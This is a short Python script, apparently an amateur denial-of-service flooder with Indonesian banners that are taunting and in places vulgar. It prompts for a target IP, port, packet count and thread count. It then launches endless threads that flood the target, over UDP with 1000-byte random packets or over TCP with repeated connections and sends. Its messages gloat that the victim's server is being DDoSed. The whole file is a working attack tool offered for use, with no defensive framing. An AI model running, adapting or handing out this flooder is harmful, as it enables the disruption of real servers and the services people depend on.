#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > ZERIX NIH BOSS!! < - - ")
print       (" - - > NGERI ABIEZZZ !!!! < - - ")
print       (" - - > Zerix <- - ")                                   
print       (" - - > Yahahahahaha !! < - - ")
print       (" - - > JAN ABUSE TOD < - - ")
print       (" - - > KontolLodon < - - ")
print       (" - - > Zerix Tampan KATA ILHAM  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PM GUA BANG KALO NGAK TERIMA,ZERIX C*K!!! ")
		except:
			print("[!] SANTAY BANG SERVER LU KENA DDOS!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PM GUA BANG KALO NGAK TERIMA,ZERIX C*K!!! ")
		except:
			s.close()
			print("[*] SANTAY BANG SERVER LU KENA DDOS!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()